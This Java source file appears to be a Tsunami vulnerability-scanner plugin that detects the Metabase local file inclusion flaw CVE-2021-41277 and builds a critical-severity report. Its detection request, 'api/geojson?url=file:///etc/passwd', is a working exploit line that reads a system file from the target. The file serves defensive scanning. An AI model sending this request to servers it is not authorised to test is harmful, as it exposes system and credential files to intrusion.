/*
 * Copyright 2021 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package com.google.tsunami.plugins.detectors.metabase;

import static com.google.common.base.Preconditions.checkNotNull;
import static com.google.common.collect.ImmutableList.toImmutableList;
import static com.google.tsunami.common.net.http.HttpRequest.get;

import com.google.common.collect.ImmutableList;
import com.google.common.flogger.GoogleLogger;
import com.google.protobuf.util.Timestamps;
import com.google.tsunami.common.data.NetworkServiceUtils;
import com.google.tsunami.common.net.http.HttpClient;
import com.google.tsunami.common.net.http.HttpResponse;
import com.google.tsunami.common.net.http.HttpStatus;
import com.google.tsunami.common.time.UtcClock;
import com.google.tsunami.plugin.PluginType;
import com.google.tsunami.plugin.VulnDetector;
import com.google.tsunami.plugin.annotations.PluginInfo;
import com.google.tsunami.proto.DetectionReport;
import com.google.tsunami.proto.DetectionReportList;
import com.google.tsunami.proto.DetectionStatus;
import com.google.tsunami.proto.NetworkService;
import com.google.tsunami.proto.Severity;
import com.google.tsunami.proto.TargetInfo;
import com.google.tsunami.proto.Vulnerability;
import com.google.tsunami.proto.VulnerabilityId;
import java.io.IOException;
import java.time.Clock;
import java.time.Instant;
import java.util.regex.Pattern;
import javax.inject.Inject;

/**
 * A {@link VulnDetector} that detects MetaBase Local File Inclusion(CVE-2021-41277)
 */
@PluginInfo(
    type = PluginType.VULN_DETECTION,
    name = "MetabaseCve202141277Detector",
    version = "0.1",
    description = "This detector checks for MetaBase Local File Inclusion(CVE-2021-41277).",
    author = "C4o (syttcasd@gmail.com)",
    bootstrapModule = MetabaseCve202141277DetectorBootstrapModule.class)
public final class MetabaseCve202141277Detector implements VulnDetector {

  private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
  private static final Pattern VULNERABILITY_RESPONSE_PATTERN = Pattern.compile("(root:[x*]:0:0:)");

  private final Clock utcClock;
  private final HttpClient httpClient;

  @Inject
  MetabaseCve202141277Detector(@UtcClock Clock utcClock, HttpClient httpClient) {
    this.utcClock = checkNotNull(utcClock);
    this.httpClient = checkNotNull(httpClient);
  }

  @Override
  public DetectionReportList detect(
      TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
    return DetectionReportList.newBuilder()
        .addAllDetectionReports(
            matchedServices.stream()
                .filter(NetworkServiceUtils::isWebService)
                .filter(this::isServiceVulnerable)
                .map(networkService -> buildDetectionReport(targetInfo, networkService))
                .collect(toImmutableList()))
        .build();
  }

  private boolean isServiceVulnerable(NetworkService networkService) {
    String targetUri = NetworkServiceUtils.buildWebApplicationRootUrl(networkService)
        + "api/geojson?url=file:///etc/passwd";
    try {
      HttpResponse response =
          httpClient.send(get(targetUri).withEmptyHeaders().build(), networkService);
      if (response.status() == HttpStatus.OK && response.bodyString().isPresent()) {
        if (VULNERABILITY_RESPONSE_PATTERN.matcher(response.bodyString().get()).find()) {
          return true;
        }
      }
    } catch (IOException e) {
      logger.atWarning().withCause(e).log("Unable to query '%s'.", targetUri);
    }
    return false;
  }

  private DetectionReport buildDetectionReport(
      TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
    return DetectionReport.newBuilder()
        .setTargetInfo(targetInfo)
        .setNetworkService(vulnerableNetworkService)
        .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
        .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
        .setVulnerability(
            Vulnerability.newBuilder()
                .setMainId(VulnerabilityId.newBuilder().setPublisher("TSUNAMI_COMMUNITY")
                    .setValue("CVE_2021_41277"))
                .setSeverity(Severity.CRITICAL)
                .setTitle("Metabase CVE-2021-41277 Local File Inclusion Vulnerability")
                .setDescription("Metabase is an open source data analytics platform. In affected "
                    + "versions a security issue has been discovered with the custom GeoJSON map "
                    + "(`admin->settings->maps->custom maps->add a map`) support and potential "
                    + "local file inclusion (including environment variables). URLs were not "
                    + "validated prior to being loaded. This issue is fixed in a new maintenance "
                    + "release (0.40.5 and 1.40.5), and any subsequent release after that.")
                .setRecommendation("upgrade to latest version")
        ).build();
  }
}
